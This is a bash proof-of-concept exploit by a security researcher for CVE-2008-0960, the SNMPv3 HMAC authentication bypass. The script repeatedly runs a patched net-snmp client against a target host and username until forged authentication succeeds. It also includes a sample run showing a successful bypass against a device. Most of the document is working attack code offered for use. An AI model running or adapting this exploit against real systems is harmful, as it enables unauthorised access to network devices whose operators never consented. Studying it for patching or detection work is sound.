#!/bin/bash
#############################################################################
#                                                                           #
# snmpv3_exp.sh exploit the vulnerability described in CVE-2008-0960, the   #
# HMAC check problem (on multiple vendor)                                   #
#                                                                           #
# Copyright (c) 2008 @ Mediaservice.net Srl. All rights reserved            #
# Wrote by Maurizio Agazzini <inode[at]mediaservice.net>                    #
# http://lab.mediaservice.net/                                              #
#                                                                           #
# Redistribution and use in source and binary forms, with or without        #
# modification, are permitted provided that the following conditions        #
# are met:                                                                  #
#     # Redistributions of source code must retain the above copyright      #
#       notice, this list of conditions and the following disclaimer.       #
#     # Redistributions in binary form must reproduce the above copyright   #
#       notice, this list of conditions and the following disclaimer in     #
#       the documentation and/or other materials provided with the          #
#       distribution.                                                       #
#     # Neither the name of @ Mediaservice.net nor the names of its         #
#       contributors may be used to endorse or promote products derived     #
#       from this software without specific prior written permission.       #
#                                                                           #
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS       #
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT         #
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR     #
# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT      #
# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,     #
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED  #
# TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR    #
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF    #
# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING      #
# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS        #
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.              #
#############################################################################

# To use this little bash script you need to patch net-snmp with 
# snmpv3_exp.patch. This is an example, so you will have to modify the 
# variables SNMP_BIN and SNMP_ARGS to do what you want. It's possible that 
# you have to run it two time before the command is executed.

#inode@pandora:~/net-snmp-5.4.1.1$ patch -p0 < snmpv3_exp.patch
#patching file snmplib/snmpusm.c
#inode@pandora:~/net-snmp-5.4.1.1$
#inode@pandora:~/net-snmp-5.4.1.1$ ./configure ; make
# [...]
#inode@pandora:~/net-snmp-5.4.1.1$ ./snmpv3_exp.sh 192.168.1.1 netadmin
#
#SNMPv3 HMAC bypass for CVE-2008-0960 v0.1
#Copyright (c) 2008 @ Mediaservice.net
#Agazzini Maurizio - inode@mediaservice.net
#
#working: .....
#Command executed in 5 try
#DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (83689750) 9 days, 16:28:17.50
#inode@pandora:~/net-snmp-5.4.1.1$
#


VERSION="0.1"

SNMP_BIN=apps/snmpget
SNMP_ARGS="-v 3 -u $2 -l authNoPriv -a MD5 -A aaaaaaaaaaaa $1 sysUpTime.0"

begin=0
end=1000

echo ""
echo "SNMPv3 HMAC bypass for CVE-2008-0960 v$VERSION"
echo "Copyright (c) 2008 @ Mediaservice.net"
echo "Agazzini Maurizio - inode@mediaservice.net"
echo ""

# Input control
if [ -z "$2"  ]; then
	echo "usage: $0 host username"
	echo ""
	exit
fi

echo -n "working: "

while :
do 

	export EXP=66

	RESP=`$SNMP_BIN $SNMP_ARGS -Lo`

	if [ $? -eq 0 ]; then
		echo ""
		echo "Command executed in $begin try"
		echo "$RESP"
		exit
	fi

	WRONG=`echo "$RESP" | grep "Unknown user name"`

	if [ "$WRONG" != "" ]; then
		echo "invalid username, check the insered username"
		echo ""
		exit
	fi

	echo -n "."

        if [ $begin -eq $end ]; then
                break
        else
                begin=`expr $begin + 1`
        fi

done
